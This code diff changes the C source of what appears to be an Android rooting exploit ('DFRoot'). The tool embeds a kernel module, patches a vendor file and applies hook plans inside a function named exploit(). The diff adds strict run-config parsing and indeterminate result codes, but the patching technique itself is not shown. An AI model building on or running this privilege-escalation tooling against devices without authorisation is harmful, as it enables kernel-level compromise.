@@ -1,4 +1,9 @@
 /* Modified 2026-11-17 (DFRoot GZIF): .incbin reduced to dfroot-android13-5.15.ko; KO_TARGET_CANDIDATES reduced to /vendor/lib64/AIAwbModel_v2.2.tflite. See NOTICE. */
+/* Modified 2026-11-25 (PR #2): require a strict, admitted run-config artifact
+ * before any patch work; its manager/mode/disable flags are consumed here and
+ * by bootstrap. See NOTICE. */
+/* Modified 2026-11-25 (PR #2): an unobserved or ambiguous final outcome maps
+ * to rc7 indeterminate, never to a definitive failure or success. See NOTICE. */
 #include <stddef.h>
 #include <stdint.h>
 
@@ -50,6 +55,9 @@ static int df_helper_block_matches(const uint8_t observed[16],
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include "aes256.h"
+/* PR #2: shared strict Java/native run-config codec (not a status protocol).
+ * Master's status_protocol.c/final_status_publish.c are the SINGLE protocol. */
+#include "run_config_codec.h"
 #include "status_protocol.h"
 #include "final_status_publish.h"
 #include "elf_parser.h"
@@ -84,6 +92,13 @@ static int      g_sender_port;
 static uint32_t g_spi;
 static uint8_t  g_aes_key[32];
 static uint32_t g_seq = 1;
+
+/* PR #2: admitted run-config snapshot identity, retained for diagnostics
+ * only. Authority for the outcome remains master's nonce-bound protocol. */
+static char             g_operation_id[RUN_CONFIG_OPERATION_ID_MAX + 1];
+static uint64_t         g_generation;
+static char             g_manager[RUN_CONFIG_MANAGER_MAX + 1];
+static run_config_mode_t g_mode;
 
 #define MAX_RESTORE_RECORDS 4
 #define MAX_HOOK_PLANS 2
@@ -1006,27 +1021,10 @@ static const char *detect_ko_target(void) {
     return NULL;
 }
 
-/* Caller has already validated both characters with isxdigit(). */
-static int hex_nibble(unsigned char c) {
-    if (c >= '0' && c <= '9') return c - '0';
-    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
-    return c - 'A' + 10;
-}
-
-static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
-    if (strlen(hex) != len * 2) return -1;
-    for (size_t i = 0; i < len; i++) {
-        unsigned char hi = (unsigned char)hex[i * 2];
-        unsigned char lo = (unsigned char)hex[i * 2 + 1];
-        if (!isxdigit(hi) || !isxdigit(lo)) return -1;
-        out[i] = (uint8_t)((hex_nibble(hi) << 4) | hex_nibble(lo));
-    }
-    return 0;
-}
-
 static void usage(const char *argv0) {
     fprintf(stderr,
-            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX\n", argv0);
+            "usage: %s --encap-port PORT --sender-port PORT --spi SPI "
+            "--aes-key HEX64 --run-config PATH\n", argv0);
 }
 
 /* Bionic at minSdk 32 provides neither explicit_bzero() nor memset_s();
@@ -1058,51 +1056,47 @@ static int parse_spi(const char *s, uint32_t *out) {
     return 0;
 }
 
+static const char *mode_name(run_config_mode_t mode)
+{
+    return mode == RUN_CONFIG_MODE_UNATTENDED_BOOT ? "unattended_boot" : "manual";
+}
+
 static int setup(int argc, char **argv) {
-    int encap_port = 0, sender_port = 0;
-    uint32_t spi = 0;
-    uint8_t aes_key[32];
-    int have_aes = 0, have_encap = 0, have_sender = 0, have_spi = 0;
-#define USAGE_FAIL() do { usage(argv[0]); clear_secret(aes_key, sizeof(aes_key)); return 2; } while (0)
-
-    for (int i = 1; i < argc; i++) {
-        const char *a = argv[i];
-        if (!strcmp(a, "--encap-port") && i + 1 < argc) {
-            if (have_encap) { USAGE_FAIL(); }
-            if (parse_port(argv[++i], &encap_port)) { USAGE_FAIL(); }
-            have_encap = 1;
-        } else if (!strcmp(a, "--sender-port") && i + 1 < argc) {
-            if (have_sender) { USAGE_FAIL(); }
-            if (parse_port(argv[++i], &sender_port)) { USAGE_FAIL(); }
-            have_sender = 1;
-        } else if (!strcmp(a, "--spi") && i + 1 < argc) {
-            if (have_spi) { USAGE_FAIL(); }
-            if (parse_spi(argv[++i], &spi)) { USAGE_FAIL(); }
-            have_spi = 1;
-        } else if (!strcmp(a, "--aes-key") && i + 1 < argc) {
-            if (have_aes) { USAGE_FAIL(); }
-            /* Residual risk: the key is still passed as argv (visible in
-             * /proc/<pid>/cmdline). Java branch 2 is unchanged to avoid a
-             * cross-branch conflict; a full fix needs Java to hand the key
-             * over via fd/pipe and native to read it there. The CLI format
-             * stays unchanged so that contract is not broken. */
-            if (hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) != 0) {
-                USAGE_FAIL();
-            }
-            have_aes = 1;
-        } else { USAGE_FAIL(); }
+    /* PR #2: strict native argv parser requires --run-config; the admitted
+     * snapshot is validated before any patch work. Master's own range checks
+     * are subsumed by run_config_parse_native_args() (duplicate/unknown/
+     * out-of-range arguments are rejected there). */
+    struct run_config_native_args args;
+    if (run_config_parse_native_args(argc, argv, &args) != 0) {
+        fprintf(stderr, "invalid native arguments: %s\n", run_config_last_error());
+        /* Defense in depth: even a rejected parse may have filled the local
+         * key buffer before failing. Master wipes it on every USAGE_FAIL. */
+        clear_secret(args.aes_key, sizeof(args.aes_key));
+        usage(argv[0]);
+        return 2;
     }
-    if (!have_encap || !have_sender || !have_spi || !have_aes) {
-        USAGE_FAIL();
+    struct run_config config;
+    if (run_config_parse_file(args.run_config_path, &config) != 0) {
+        fprintf(stderr, "run-config rejected: %s\n", run_config_last_error());
+        clear_secret(args.aes_key, sizeof(args.aes_key));
+        return 2;
     }
+    memcpy(g_operation_id, config.operation_id, sizeof(g_operation_id));
+    g_generation = config.generation;
+    memcpy(g_manager, config.manager, sizeof(g_manager));
+    g_mode = config.mode;
 
-    g_encap_port  = encap_port;
-    g_sender_port = sender_port;
-    g_spi         = spi;
+    g_encap_port  = args.encap_port;
+    g_sender_port = args.sender_port;
+    g_spi         = args.spi;
     g_seq         = 1;
-    memcpy(g_aes_key, aes_key, 32);
-    clear_secret(aes_key, sizeof(aes_key));
+    memcpy(g_aes_key, args.aes_key, sizeof(g_aes_key));
+    /* Master wipes the argv-derived LOCAL copy immediately after the copy;
+     * the global g_aes_key is the only copy that survives setup(). */
+    clear_secret(args.aes_key, sizeof(args.aes_key));
 
+    /* Master's KO-target preflight: presence is authoritative; no fallback to
+     * a guessed target. */
     const char *ko_target = detect_ko_target();
     if (!ko_target) {
         printf("no KO target exists; expected /vendor/lib64/AIAwbModel_v2.2.tflite\n");
@@ -1115,9 +1109,14 @@ static int setup(int argc, char **argv) {
 
     printf("=== setup ===\n");
     printf("found ko_target: %s\n", ko_target);
-    printf("encap port: %d\n", encap_port);
-    printf("spi: 0x%x\n", spi);
-#undef USAGE_FAIL
+    printf("encap port: %d\n", (int)args.encap_port);
+    printf("spi: 0x%x\n", args.spi);
+    printf("run-config: operation=%s generation=%llu manager=%s mode=%s\n",
+           g_operation_id, (unsigned long long)g_generation, g_manager,
+           mode_name(g_mode));
+    /* The LOCAL argv-derived copy was already wiped after the copy above;
+     * the global g_aes_key stays intact for the transform and is wiped on
+     * every exit path. */
     return 0;
 }
 
@@ -1445,7 +1444,9 @@ static int exploit(struct preflight *pf) {
     if (patch_ko(pf)) goto done;
     if (apply_hook_plan(pf, &pf->plans[pf->selected])) goto done;
 
-    rc = 2;
+    /* Unknown until a run-scoped marker is observed or the read deadline
+     * expires; a deadline expiry is indeterminate, not a definitive failure. */
+    rc = DF_RC_ATTEMPT_UNKNOWN;
     usleep(500000);
 
     printf("\n=== init  ===\n");
@@ -1465,25 +1466,21 @@ static int exploit(struct preflight *pf) {
     io.report          = exp_report;
     io.nonce           = nonce;
 
-    /* 70 s budget covers the 60 s late-load wait plus slack. A REBOOT_PENDING
-     * preflight rebases a 10 s grace window past that budget, capped at 85 s
-     * overall. status_flow_run invokes the cleanup callback exactly once on
-     * EVERY exit (bound=1 only for a normal bound token), charges that time to
-     * the same 85 s clock, and reports restore failure separately. No reboot
-     * command is claimed to have been issued before that point. */
+    /* Master's single protocol: 70 s budget, 10 s pending grace, 85 s overall.
+     * status_flow_run() invokes cleanup exactly once on every exit and charges
+     * that time to the same absolute deadline. */
     wait = status_flow_run(&io, pf, DF_WAIT_BUDGET_MS, DF_WAIT_GRACE_MS,
                            DF_WAIT_OVERALL_MS, status_cleanup_cb, &outcome,
                            &cleanup_failed);
     if (cleanup_failed) pf->cleanup_failed = 1;
     if (wait == ERR) {
-        /* Clock fault, guard fault or an unrecoverable protocol error: the
-         * lifecycle and recovery result are UNKNOWN. status_flow_run has
-         * already forced one unbound cleanup and marked recovery failed; this
-         * is safety-critical, never a normal completion. */
+        /* PR #2 honest indeterminate contract: a clock/guard/protocol fault
+         * observes no completed outcome, so rc7 (NOT a definitive failure) is
+         * reported. Master's protocol still owns cleanup and the recovery
+         * gate; status_flow_run already forced one unbound cleanup. */
         pf->cleanup_failed = 1;
-        rc = DF_RC_UNKNOWN;
-        printf("status: recovery status UNKNOWN (rc=%d); no reboot authorized\n",
-               rc);
+        rc = DF_RC_ATTEMPT_UNKNOWN;
+        printf("status: indeterminate rc=%d (recovery UNKNOWN); no reboot authorized\n", rc);
         goto done;
     }
     printf("status: %s (rc=%d)\n",
@@ -1491,6 +1488,13 @@ static int exploit(struct preflight *pf) {
            wait == TIMEOUT ? "timeout waiting for final status" : "status error",
            df_outcome_to_rc(outcome));
     rc = df_outcome_to_rc(outcome);
+    if (outcome == DF_OUTCOME_NONE) {
+        /* PR #2: no final status was observed, so completion was not verified.
+         * Keep rc7 indeterminate rather than a definitive failure while
+         * privileged children may still be running. */
+        rc = DF_RC_ATTEMPT_UNKNOWN;
+        printf("status: no bound final observation; indeterminate rc=%d\n", rc);
+    }
     return rc;
 done:
     /* No usable bootstrap observation (patch/nonce/orphan failure, or an ERR
